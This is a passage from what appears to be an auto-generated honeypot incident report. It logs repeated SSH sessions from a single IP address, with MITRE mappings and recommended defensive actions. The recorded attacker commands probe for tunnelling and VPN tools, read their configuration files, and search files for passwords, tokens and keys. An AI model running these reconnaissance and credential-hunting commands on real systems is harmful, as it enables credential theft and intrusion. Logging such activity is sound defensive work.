| `2026-07-13 12:33:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70e4887846de

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:33 |
| **Last Seen** | 2026-07-13 12:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `which /usr/local/bin/ngrok 2>/dev/null; ls -la /usr/local/bin/ngrok 2>/dev/null; pgrep -af ngrok 2>/dev/null` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:33:56` | `cowrie.session.connect` |
| `2026-07-13 12:33:56` | `cowrie.client.version` |
| `2026-07-13 12:33:56` | `cowrie.client.kex` |
| `2026-07-13 12:33:57` | `cowrie.login.success` |
| `2026-07-13 12:33:57` | `cowrie.client.var` |
| `2026-07-13 12:33:57` | `cowrie.client.var` |
| `2026-07-13 12:33:58` | `cowrie.session.params` |
| `2026-07-13 12:33:58` | `cowrie.command.input` |
| `2026-07-13 12:33:58` | `cowrie.log.closed` |
| `2026-07-13 12:33:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af965fb2cc61

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:33 |
| **Last Seen** | 2026-07-13 12:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `which /usr/sbin/iodine 2>/dev/null; ls -la /usr/sbin/iodine 2>/dev/null; pgrep -af iodine 2>/dev/null` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:33:59` | `cowrie.session.connect` |
| `2026-07-13 12:33:59` | `cowrie.client.version` |
| `2026-07-13 12:33:59` | `cowrie.client.kex` |
| `2026-07-13 12:34:00` | `cowrie.login.success` |
| `2026-07-13 12:34:00` | `cowrie.client.var` |
| `2026-07-13 12:34:00` | `cowrie.client.var` |
| `2026-07-13 12:34:01` | `cowrie.session.params` |
| `2026-07-13 12:34:01` | `cowrie.command.input` |
| `2026-07-13 12:34:01` | `cowrie.log.closed` |
| `2026-07-13 12:34:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd2293d4a44d

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:34 |
| **Last Seen** | 2026-07-13 12:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `which /usr/sbin/iodined 2>/dev/null; ls -la /usr/sbin/iodined 2>/dev/null; pgrep -af iodined 2>/dev/null` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:34:01` | `cowrie.session.connect` |
| `2026-07-13 12:34:01` | `cowrie.client.version` |
| `2026-07-13 12:34:02` | `cowrie.client.kex` |
| `2026-07-13 12:34:03` | `cowrie.login.success` |
| `2026-07-13 12:34:03` | `cowrie.client.var` |
| `2026-07-13 12:34:03` | `cowrie.client.var` |
| `2026-07-13 12:34:04` | `cowrie.session.params` |
| `2026-07-13 12:34:04` | `cowrie.command.input` |
| `2026-07-13 12:34:04` | `cowrie.log.closed` |
| `2026-07-13 12:34:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a43c9367813f

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:34 |
| **Last Seen** | 2026-07-13 12:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `which /usr/bin/dnscat2 2>/dev/null; ls -la /usr/bin/dnscat2 2>/dev/null; pgrep -af dnscat2 2>/dev/null` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:34:05` | `cowrie.session.connect` |
| `2026-07-13 12:34:05` | `cowrie.client.version` |
| `2026-07-13 12:34:05` | `cowrie.client.kex` |
| `2026-07-13 12:34:06` | `cowrie.login.success` |
| `2026-07-13 12:34:07` | `cowrie.client.var` |
| `2026-07-13 12:34:07` | `cowrie.client.var` |
| `2026-07-13 12:34:07` | `cowrie.session.params` |
| `2026-07-13 12:34:07` | `cowrie.command.input` |
| `2026-07-13 12:34:07` | `cowrie.log.closed` |
| `2026-07-13 12:34:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-304f37360972

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:34 |
| **Last Seen** | 2026-07-13 12:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `which /usr/bin/socat 2>/dev/null; ls -la /usr/bin/socat 2>/dev/null; pgrep -af socat 2>/dev/null` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:34:08` | `cowrie.session.connect` |
| `2026-07-13 12:34:08` | `cowrie.client.version` |
| `2026-07-13 12:34:08` | `cowrie.client.kex` |
| `2026-07-13 12:34:09` | `cowrie.login.success` |
| `2026-07-13 12:34:10` | `cowrie.client.var` |
| `2026-07-13 12:34:10` | `cowrie.client.var` |
| `2026-07-13 12:34:10` | `cowrie.session.params` |
| `2026-07-13 12:34:10` | `cowrie.command.input` |
| `2026-07-13 12:34:10` | `cowrie.log.closed` |
| `2026-07-13 12:34:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cac5a342ee7f

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:34 |
| **Last Seen** | 2026-07-13 12:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `which /usr/sbin/rinetd 2>/dev/null; ls -la /usr/sbin/rinetd 2>/dev/null; pgrep -af rinetd 2>/dev/null` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:34:11` | `cowrie.session.connect` |
| `2026-07-13 12:34:11` | `cowrie.client.version` |
| `2026-07-13 12:34:11` | `cowrie.client.kex` |
| `2026-07-13 12:34:12` | `cowrie.login.success` |
| `2026-07-13 12:34:13` | `cowrie.client.var` |
| `2026-07-13 12:34:13` | `cowrie.client.var` |
| `2026-07-13 12:34:14` | `cowrie.session.params` |
| `2026-07-13 12:34:14` | `cowrie.command.input` |
| `2026-07-13 12:34:14` | `cowrie.log.closed` |
| `2026-07-13 12:34:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-411e10e7ae4f

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:34 |
| **Last Seen** | 2026-07-13 12:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `ls -la /etc/rinetd.conf 2>/dev/null; cat /etc/rinetd.conf 2>/dev/null | head -100` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:34:14` | `cowrie.session.connect` |
| `2026-07-13 12:34:14` | `cowrie.client.version` |
| `2026-07-13 12:34:14` | `cowrie.client.kex` |
| `2026-07-13 12:34:16` | `cowrie.login.success` |
| `2026-07-13 12:34:16` | `cowrie.client.var` |
| `2026-07-13 12:34:16` | `cowrie.client.var` |
| `2026-07-13 12:34:17` | `cowrie.session.params` |
| `2026-07-13 12:34:17` | `cowrie.command.input` |
| `2026-07-13 12:34:17` | `cowrie.log.closed` |
| `2026-07-13 12:34:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2c3d05c06cd

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:34 |
| **Last Seen** | 2026-07-13 12:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `which /usr/bin/gost 2>/dev/null; ls -la /usr/bin/gost 2>/dev/null; pgrep -af gost 2>/dev/null` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:34:17` | `cowrie.session.connect` |
| `2026-07-13 12:34:17` | `cowrie.client.version` |
| `2026-07-13 12:34:18` | `cowrie.client.kex` |
| `2026-07-13 12:34:19` | `cowrie.login.success` |
| `2026-07-13 12:34:19` | `cowrie.client.var` |
| `2026-07-13 12:34:19` | `cowrie.client.var` |
| `2026-07-13 12:34:20` | `cowrie.session.params` |
| `2026-07-13 12:34:20` | `cowrie.command.input` |
| `2026-07-13 12:34:20` | `cowrie.log.closed` |
| `2026-07-13 12:34:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba9e39319adb

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:34 |
| **Last Seen** | 2026-07-13 12:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `which /usr/local/bin/gost 2>/dev/null; ls -la /usr/local/bin/gost 2>/dev/null; pgrep -af gost 2>/dev/null` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:34:21` | `cowrie.session.connect` |
| `2026-07-13 12:34:21` | `cowrie.client.version` |
| `2026-07-13 12:34:21` | `cowrie.client.kex` |
| `2026-07-13 12:34:22` | `cowrie.login.success` |
| `2026-07-13 12:34:23` | `cowrie.client.var` |
| `2026-07-13 12:34:23` | `cowrie.client.var` |
| `2026-07-13 12:34:23` | `cowrie.session.params` |
| `2026-07-13 12:34:23` | `cowrie.command.input` |
| `2026-07-13 12:34:23` | `cowrie.log.closed` |
| `2026-07-13 12:34:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac4cfee320e8

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:34 |
| **Last Seen** | 2026-07-13 12:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `which /usr/bin/brook 2>/dev/null; ls -la /usr/bin/brook 2>/dev/null; pgrep -af brook 2>/dev/null` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:34:24` | `cowrie.session.connect` |
| `2026-07-13 12:34:24` | `cowrie.client.version` |
| `2026-07-13 12:34:24` | `cowrie.client.kex` |
| `2026-07-13 12:34:25` | `cowrie.login.success` |
| `2026-07-13 12:34:26` | `cowrie.client.var` |
| `2026-07-13 12:34:26` | `cowrie.client.var` |
| `2026-07-13 12:34:26` | `cowrie.session.params` |
| `2026-07-13 12:34:26` | `cowrie.command.input` |
| `2026-07-13 12:34:27` | `cowrie.log.closed` |
| `2026-07-13 12:34:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e64acc64b68e

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:34 |
| **Last Seen** | 2026-07-13 12:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `which /usr/bin/wg 2>/dev/null; ls -la /usr/bin/wg 2>/dev/null; pgrep -af wg 2>/dev/null` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:34:27` | `cowrie.session.connect` |
| `2026-07-13 12:34:27` | `cowrie.client.version` |
| `2026-07-13 12:34:27` | `cowrie.client.kex` |
| `2026-07-13 12:34:29` | `cowrie.login.success` |
| `2026-07-13 12:34:29` | `cowrie.client.var` |
| `2026-07-13 12:34:29` | `cowrie.client.var` |
| `2026-07-13 12:34:30` | `cowrie.session.params` |
| `2026-07-13 12:34:30` | `cowrie.command.input` |
| `2026-07-13 12:34:30` | `cowrie.log.closed` |
| `2026-07-13 12:34:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-310e8df0f42c

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:34 |
| **Last Seen** | 2026-07-13 12:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `ls -la /etc/wireguard/ 2>/dev/null; cat /etc/wireguard/ 2>/dev/null | head -100` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:34:30` | `cowrie.session.connect` |
| `2026-07-13 12:34:30` | `cowrie.client.version` |
| `2026-07-13 12:34:31` | `cowrie.client.kex` |
| `2026-07-13 12:34:32` | `cowrie.login.success` |
| `2026-07-13 12:34:32` | `cowrie.client.var` |
| `2026-07-13 12:34:32` | `cowrie.client.var` |
| `2026-07-13 12:34:33` | `cowrie.session.params` |
| `2026-07-13 12:34:33` | `cowrie.command.input` |
| `2026-07-13 12:34:33` | `cowrie.log.closed` |
| `2026-07-13 12:34:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89eb9e293b2b

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:34 |
| **Last Seen** | 2026-07-13 12:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `which /usr/sbin/openvpn 2>/dev/null; ls -la /usr/sbin/openvpn 2>/dev/null; pgrep -af openvpn 2>/dev/null` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:34:34` | `cowrie.session.connect` |
| `2026-07-13 12:34:34` | `cowrie.client.version` |
| `2026-07-13 12:34:34` | `cowrie.client.kex` |
| `2026-07-13 12:34:35` | `cowrie.login.success` |
| `2026-07-13 12:34:36` | `cowrie.client.var` |
| `2026-07-13 12:34:36` | `cowrie.client.var` |
| `2026-07-13 12:34:36` | `cowrie.session.params` |
| `2026-07-13 12:34:36` | `cowrie.command.input` |
| `2026-07-13 12:34:36` | `cowrie.log.closed` |
| `2026-07-13 12:34:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b0a8963d6b3

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:34 |
| **Last Seen** | 2026-07-13 12:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `ls -la /etc/openvpn/ 2>/dev/null; cat /etc/openvpn/ 2>/dev/null | head -100` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:34:37` | `cowrie.session.connect` |
| `2026-07-13 12:34:37` | `cowrie.client.version` |
| `2026-07-13 12:34:37` | `cowrie.client.kex` |
| `2026-07-13 12:34:38` | `cowrie.login.success` |
| `2026-07-13 12:34:39` | `cowrie.client.var` |
| `2026-07-13 12:34:39` | `cowrie.client.var` |
| `2026-07-13 12:34:40` | `cowrie.session.params` |
| `2026-07-13 12:34:40` | `cowrie.command.input` |
| `2026-07-13 12:34:40` | `cowrie.log.closed` |
| `2026-07-13 12:34:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2546337b585a

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:34 |
| **Last Seen** | 2026-07-13 12:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `ps aux | grep -iE 'proxy|tunnel|socks|vpn|forward|relay|tor|v2ray|xray|clash|shadowsocks|frp|ngrok|squid|dante|privoxy|polipo|haproxy|nginx.*stream|openvpn|wireguard' | grep -v grep` |
| **TTPs (MITRE)** | T1057 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:34:40` | `cowrie.session.connect` |
| `2026-07-13 12:34:40` | `cowrie.client.version` |
| `2026-07-13 12:34:40` | `cowrie.client.kex` |
| `2026-07-13 12:34:42` | `cowrie.login.success` |
| `2026-07-13 12:34:42` | `cowrie.client.var` |
| `2026-07-13 12:34:42` | `cowrie.client.var` |
| `2026-07-13 12:34:43` | `cowrie.session.params` |
| `2026-07-13 12:34:43` | `cowrie.command.input` |
| `2026-07-13 12:34:43` | `cowrie.log.closed` |
| `2026-07-13 12:34:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71a61156af77

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:34 |
| **Last Seen** | 2026-07-13 12:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `find /home /etc /opt /var -type f \( -name '*.conf' -o -name '*.cfg' -o -name '*.ini' -o -name '*.json' -o -name '*.yaml' -o -name '*.yml' -o -name '*.txt' -o -name '*.env' -o -name '*.sh' \) -exec grep -li 'password' {} \; 2>/dev/null | head -20` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:34:43` | `cowrie.session.connect` |
| `2026-07-13 12:34:43` | `cowrie.client.version` |
| `2026-07-13 12:34:44` | `cowrie.client.kex` |
| `2026-07-13 12:34:45` | `cowrie.login.success` |
| `2026-07-13 12:34:45` | `cowrie.client.var` |
| `2026-07-13 12:34:45` | `cowrie.client.var` |
| `2026-07-13 12:34:46` | `cowrie.session.params` |
| `2026-07-13 12:34:46` | `cowrie.command.input` |
| `2026-07-13 12:34:46` | `cowrie.log.closed` |
| `2026-07-13 12:34:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c9856c83abf

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:34 |
| **Last Seen** | 2026-07-13 12:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat -bash: 2>/dev/null | grep -iE 'password|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:34:47` | `cowrie.session.connect` |
| `2026-07-13 12:34:47` | `cowrie.client.version` |
| `2026-07-13 12:34:47` | `cowrie.client.kex` |
| `2026-07-13 12:34:48` | `cowrie.login.success` |
| `2026-07-13 12:34:49` | `cowrie.client.var` |
| `2026-07-13 12:34:49` | `cowrie.client.var` |
| `2026-07-13 12:34:49` | `cowrie.session.params` |
| `2026-07-13 12:34:49` | `cowrie.command.input` |
| `2026-07-13 12:34:49` | `cowrie.log.closed` |
| `2026-07-13 12:34:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09dcfc74e85f

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:34 |
| **Last Seen** | 2026-07-13 12:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat syntax 2>/dev/null | grep -iE 'password|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:34:50` | `cowrie.session.connect` |
| `2026-07-13 12:34:50` | `cowrie.client.version` |
| `2026-07-13 12:34:50` | `cowrie.client.kex` |
| `2026-07-13 12:34:51` | `cowrie.login.success` |
| `2026-07-13 12:34:52` | `cowrie.client.var` |
| `2026-07-13 12:34:52` | `cowrie.client.var` |
| `2026-07-13 12:34:52` | `cowrie.session.params` |
| `2026-07-13 12:34:52` | `cowrie.command.input` |
| `2026-07-13 12:34:52` | `cowrie.log.closed` |
| `2026-07-13 12:34:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5a4a48ddd3b

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:34 |
| **Last Seen** | 2026-07-13 12:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat error 2>/dev/null | grep -iE 'password|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:34:53` | `cowrie.session.connect` |
| `2026-07-13 12:34:53` | `cowrie.client.version` |
| `2026-07-13 12:34:53` | `cowrie.client.kex` |
| `2026-07-13 12:34:55` | `cowrie.login.success` |
| `2026-07-13 12:34:55` | `cowrie.client.var` |
| `2026-07-13 12:34:55` | `cowrie.client.var` |
| `2026-07-13 12:34:56` | `cowrie.session.params` |
| `2026-07-13 12:34:56` | `cowrie.command.input` |
| `2026-07-13 12:34:56` | `cowrie.log.closed` |
| `2026-07-13 12:34:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69750452c4c3

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:34 |
| **Last Seen** | 2026-07-13 12:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat near 2>/dev/null | grep -iE 'password|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:34:56` | `cowrie.session.connect` |
| `2026-07-13 12:34:56` | `cowrie.client.version` |
| `2026-07-13 12:34:57` | `cowrie.client.kex` |
| `2026-07-13 12:34:58` | `cowrie.login.success` |
| `2026-07-13 12:34:58` | `cowrie.client.var` |
| `2026-07-13 12:34:58` | `cowrie.client.var` |
| `2026-07-13 12:34:59` | `cowrie.session.params` |
| `2026-07-13 12:34:59` | `cowrie.command.input` |
| `2026-07-13 12:34:59` | `cowrie.log.closed` |
| `2026-07-13 12:34:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9a1a9f5119b

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:35 |
| **Last Seen** | 2026-07-13 12:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat unexpected 2>/dev/null | grep -iE 'password|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:35:00` | `cowrie.session.connect` |
| `2026-07-13 12:35:00` | `cowrie.client.version` |
| `2026-07-13 12:35:00` | `cowrie.client.kex` |
| `2026-07-13 12:35:01` | `cowrie.login.success` |
| `2026-07-13 12:35:02` | `cowrie.client.var` |
| `2026-07-13 12:35:02` | `cowrie.client.var` |
| `2026-07-13 12:35:02` | `cowrie.session.params` |
| `2026-07-13 12:35:02` | `cowrie.command.input` |
| `2026-07-13 12:35:02` | `cowrie.log.closed` |
| `2026-07-13 12:35:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6779780c1560

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:35 |
| **Last Seen** | 2026-07-13 12:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat token 2>/dev/null | grep -iE 'password|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:35:03` | `cowrie.session.connect` |
| `2026-07-13 12:35:03` | `cowrie.client.version` |
